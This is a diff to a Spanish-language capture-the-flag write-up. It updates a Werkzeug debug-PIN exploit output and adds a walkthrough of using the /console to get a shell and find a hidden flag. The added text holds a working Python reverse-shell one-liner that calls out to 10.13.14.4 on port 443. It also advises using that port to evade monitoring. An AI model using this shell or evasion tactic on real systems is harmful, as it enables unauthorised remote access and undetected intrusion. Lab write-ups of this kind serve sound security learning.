@@ -405,7 +405,24 @@ Ahora lo ejecutamos y ya nos debería dar un PIN valido:
 
 ```
 ❯ python3 exploit.py
-199-187-272
+228-027-395
 ```
 
 Y con este PIN logramos acceder a /console.
+
+Básicamente es una consola de Python, por lo que podemos mandaros una `reverse shell` utilizando `Python`, pero antes de esto tenemos que `poner el puerto 443 a la escucha con netcta` (ponemos el puerto 443, ya que en servidores web suele ser un puerto utilizado para `https` y, por lo tanto, al trasmitir información por ese puerto es más difícil que nos detecten, porque los programas de monitorización automatizados no suelen tener en cuenta la información que se tramita por ese puerto, ya que es normal que se tramite información por ese puerto):
+
+```
+[console ready]
+>>> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.14.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
+```
+
+Ahora si miramos con un `ls` no veremos una flag nueva, solo la que ya habiamos visto, pero con un `ls -a` si que la podremos ver ya que estaba oculta. FLAG: `AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}`
+
+```
+aas@Leakage:~$ ls -a
+. ..  .bash_history .bash_logout .bashrc flag.txt .hiddenflag.txt .ssh
+
+aas@Leakage:~$ cat .hiddenflag.txt
+AKERVA{IkNOW#=ByPassWerkZeugPinC0de!}
+```
